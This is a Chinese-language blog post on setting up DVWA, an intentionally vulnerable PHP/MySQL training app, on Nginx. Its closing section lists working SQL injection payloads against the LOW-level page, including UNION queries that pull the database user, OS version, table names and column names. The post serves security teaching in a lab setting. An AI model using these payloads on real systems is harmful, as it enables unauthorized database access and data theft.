---
title: DVWA 簡介
layout: post
comments: true
language: chinese
category: [linux,network,webserver,mysql]
keywords: linux,security,dvwa
description: DVWA (Damn Vulnerable Web Application) 是用 PHP+MySQL 編寫的一套用於漏洞檢測和教學的程序，支持多種數據庫，包括了 SQL 注入、XSS 等一些常見的安全漏洞。詳細的內容可以參考官方網站 [www.dvwa.co.uk](http://www.dvwa.co.uk/)，在此暫時僅介紹其環境的安裝方法。
---

DVWA (Damn Vulnerable Web Application) 是用 PHP+MySQL 編寫的一套用於漏洞檢測和教學的程序，支持多種數據庫，包括了 SQL 注入、XSS 等一些常見的安全漏洞。

詳細的內容可以參考官方網站 [www.dvwa.co.uk](http://www.dvwa.co.uk/)，在此暫時僅介紹其環境的安裝方法。

<!-- more -->

![dvwa logo]({{ site.url }}/images/security/dvwa-logo.jpg "dvwa logo"){: .pull-center }

## Nginx PHP 環境搭建

Nginx 和 Apache 的 PHP 安裝是有區別的，其中 Nginx 是以 fastcgi 的方式結合 Nginx 的，而 Apache 是把 php 作為自己的模塊來調用。

### 配置 Nginx 環境

假設你已經安裝好了 Nginx 環境，其中原 php-fpm 也合併到了 php 官方，那麼在 CentOS 7 中，可以通過如下方式安裝、啟動 php-fpm 。

{% highlight text %}
# yum install php php-fpm                   # 安裝PHP以及PHP-FPM
# systemctl start php-fpm                   # 啟動服務，默認使用9000
{% endhighlight %}

在 Nginx 的配置文件 /etc/nginx/nginx.conf 中添加如下內容。

{% highlight text %}
server {
    location ~ \.php$ {
        try_files      $uri =404;
        fastcgi_pass   127.0.0.1:9000;
        fastcgi_index  index.php;
        fastcgi_param  SCRIPT_FILENAME   $document_root$fastcgi_script_name;
        include        fastcgi_params;
    }
}
{% endhighlight %}

在指定的 Nginx root 目錄下添加如下的測試文件。

{% highlight text %}
$ cat foobar.php
<?php
    echo "Hello World! PHP, foobar";
?>

$ curl "http://localhost/foobar.php"     # 進行測試
{% endhighlight %}

如果沒有報錯則正常。

### 日誌設置

Nginx 是一個 web 服務器，因此 Nginx 的 access 日誌只有對訪問頁面的記錄，不會有 php 的 error log 信息；而默認的 php-fpm 只會輸出 php-fpm 的錯誤信息，在 php-fpm 的 errors log 裡也看不到 php 的 errorlog 。

原因是 php-fpm 的配置文件 /etc/php-fpm.conf 中默認是關閉 worker 進程的錯誤輸出，直接把他們重定向到 /dev/null，所以我們在 nginx 的 error log 和 php-fpm 的 errorlog 都看不到 php 的錯誤日誌。

解決 Nginx 下 php-fpm 不記錄 php 錯誤日誌的辦法:

{% highlight text %}
### 1. 修改 /etc/php-fpm.conf 中配置，沒有則增加
[global]
error_log = log/error_log
[www]
catch_workers_output = yes

### 2. 修改 php.ini 中配置，沒有則增加
log_errors = On
error_log = "/var/log/php-fpm/php-error.log"
error_reporting=E_ALL&~E_NOTICE
{% endhighlight %}

### 常見錯誤

簡單列舉下常見的問題。

#### error 404

出現 404 的原因比較多，暫時列舉幾條如下：

1. nginx 傳入參數有誤。設置配置文件 ```error_log /tmp/error.log debug;``` 然後查找 SCRIPT_FILENAME 確認路徑是否正確。

2. 權限問題。可以直接查看 ```ps aux | grep -E '(nginx:|php-fpm:)'``` 對應的用戶是否有權限，否則可以修改配置文件 ```/etc/nginx/nginx.conf```、```/etc/php-fpm.conf``` 即可。

#### File not found

表象是，在訪問 PHP 時，會提示 ```File not found.```，同時在錯誤日誌中看到如下的日誌：

{% highlight text %}
2016/02/03 22:29:23 [error] 11716#0: *1 FastCGI sent in stderr: "Primary script unknown"
while reading response header from upstream, client: 127.0.0.1, server: localhost,
request: "GET /index.php HTTP/1.1", upstream: "fastcgi://127.0.0.1:9000", host: "localhost"
{% endhighlight %}

簡單來說，就是 Nginx 配置文件中沒有找到所定義的腳本文件。

{% highlight text %}
root   /usr/local/nginx/html;
fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
{% endhighlight %}

上面配置中的 ```$document_root``` 就是 php 文件所對應的目錄。

#### Session Permission denied

查看 Nginx 的錯誤日誌，會發現如下內容。

{% highlight text %}
2016/02/03 22:36:25 [error] 18270#0: *57 FastCGI sent in stderr: "PHP message: PHP Warning:
session_start(): open(/var/lib/php/session/sess_5oh2t2mv66ce63kt4i31fcjq15, O_RDWR) "
failed: Permission denied (13) in /webserver/root/DVWA-1.9/dvwa/includes/dvwaPage.inc.php on line 8
{% endhighlight %}

這是因為存放 session 文件的目錄沒有開放寫權限給相應的用戶，此時需要在 php 的配置文件 php.ini 裡的 session.save_path 設置到臨時目錄即可，例如：```session.save_path="/tmp/php5"。

當然，也可以在 ```/etc/php-fpm.d/www.conf``` 設置 ```php_value[session.save_path] = /tmp/php5``` 。


## 配置 DVWA

結下來看看如何配置 MySQL 後臺的程序。

### 設置 MySQL 環境

對於 DVWA 來說，是需要連接到 MySQL 數據庫，假設已經安裝配置好了 MySQL 數據庫，那麼此時在使用前還需要安裝 php-mysql 模塊。

{% highlight text %}
# yum install php-mysql
{% endhighlight %}

為了測試是否正常，可以在上面定義的 Nginx 目錄下添加如下的測試文件。

{% highlight php %}
<?php
    $conn=mysql_connect("127.1", "root", "your_password") or die("connect failed". mysql_error());
    $result=mysql_db_query("mysql", "SELECT host, user FROM user", $conn);
    $row=mysql_fetch_row($result);    // 獲取查詢結果

    echo '<font face="verdana">';
    echo '<table border="1" cellpadding="1" cellspacing="2">';
    // 顯示字段名稱
    echo "</b><tr></b>";
    for ($i=0; $i<mysql_num_fields($result); $i++)
    {
      echo '<td bgcolor="#000F00"><b>'.
      mysql_field_name($result, $i);
      echo "</b></td></b>";
    }
    echo "</tr></b>";
    // 定位到第一條記錄
    mysql_data_seek($result, 0);
    // 循環取出記錄
    while ($row=mysql_fetch_row($result))
    {
      echo "<tr></b>";
      for ($i=0; $i<mysql_num_fields($result); $i++ )
      {
        echo '<td bgcolor="#00FF00">';
        echo $row[$i];
        echo '</td>';
      }
      echo "</tr></b>";
    }

    echo "</table></b>";
    echo "</font>";

    mysql_free_result($result); // 釋放資源
    mysql_close($conn);         // 關閉連接
?>
{% endhighlight %}

如果可以正常顯示錶格，那麼繼續。


### 配置 DVWA 環境

設置非常簡單，按照 nginx-php 環境搭建好之後，通過直接將 nginx 的 root 目錄指向 DVWA 的目錄，修改 ```config/config.inc.php``` 中的數據庫配置即可。

實際上只需要配置鏈接到 MySQL 的參數，其中包括了 IP 地址、用戶名、密碼，需要注意的是，對於 MySQL 無法設置端口號。

{% highlight php %}
<?php
... ...
# Database management system to use
$DBMS = 'MySQL';

# Database variables
#   WARNING: The database specified under db_database WILL BE ENTIRELY DELETED during setup.
#   Please use a database dedicated to DVWA.
$_DVWA = array();
$_DVWA[ 'db_server' ]   = '127.0.0.1';
$_DVWA[ 'db_database' ] = 'dvwa';
$_DVWA[ 'db_user' ]     = 'root';
$_DVWA[ 'db_password' ] = 'new_password';
... ...
?>
{% endhighlight %}

結下來可以直接登陸，登陸的默認密碼是 admin/password 。

### 環境配置

簡單看下如下的配置。

![dvwa setup check]({{ site.url }}/images/security/dvwa-setup-check.png "dvwa setup check"){: .pull-center }

修改 ```/etc/php.ini``` 配置文件中的 ```allow_url_include=On```。


## SQL 注入

首先在 ```DVWA Security => Security Level``` 中設置，將安全級別設置為 ```LOW``` ，然後在 ```SQL Injection``` 中進行測試；其中 User ID 為 1~5，對應的代碼在 ```vulnerabilities/sqli/source``` 中，分別對應了不同的安全等級。

### Low

例如，對於 ```LOW``` 級別，對應的 SQL 代碼如下。

{% highlight text %}
SELECT first_name, last_name FROM users WHERE user_id = '$id';
{% endhighlight %}

簡單看下常見的 SQL 注入。

{% highlight text %}
----- 正常，1
SELECT first_name, last_name FROM users WHERE user_id = '1';

----- 判斷是字符型還是數字型，1' or '1'='1，輸出所有列，為字符型
SELECT first_name, last_name FROM users WHERE user_id = '1' or '1'='1';

----- 查看SQL中查詢列數，1' ORDER BY N -- ，N從1遞增開始嘗試；另外，注意最後有個空格
SELECT first_name, last_name FROM users WHERE user_id = '1' ORDER BY 1 -- ';

----- 確定字段的顯示順序，1' UNION SELECT 1,2 #
SELECT first_name, last_name FROM users WHERE user_id = '1' UNION SELECT 1,2 #;

----- 獲取當前用戶以及庫信息，1' AND 1=2 UNION SELECT user(),database() #
SELECT first_name, last_name FROM users WHERE user_id = '1' AND 1=2 UNION SELECT user(),database() #

----- 獲取操作系統信息，1' AND 1=2 UNION SELECT 1,@@global.version_compile_os FROM mysql.user #
SELECT first_name, last_name FROM users WHERE user_id = '1' AND 1=2 UNION
    SELECT 1,@@global.version_compile_os FROM mysql.user #;

----- 獲取庫中的表名稱，如下僅顯示註冊的內容
1' UNION SELECT 1,group_concat(table_name) FROM information_schema.tables WHERE table_schema=database() #

----- 獲取表中的列名稱
1' UNION SELECT 1,group_concat(column_name) FROM information_schema.columns WHERE table_name='users' #
{% endhighlight %}

<!--
1' and exists(select * from users) -- /*猜解表名
1' and exists(select first_name from users) -- /猜解字段名
1' and 1=2 union select first_name,last_name from users -- /*猜解字段內容'
-->

實際上，在確認了列數之後，就可以通過 ```vesion()```、```database()``` 等函數查看系統信息，也可以執行查詢 SQL 語句。


<!--
### Medium

http://blog.csdn.net/qq_32400847/article/details/53697849

import binascii
print binascii.b2a_hex('users')
-->




{% highlight text %}
{% endhighlight %}
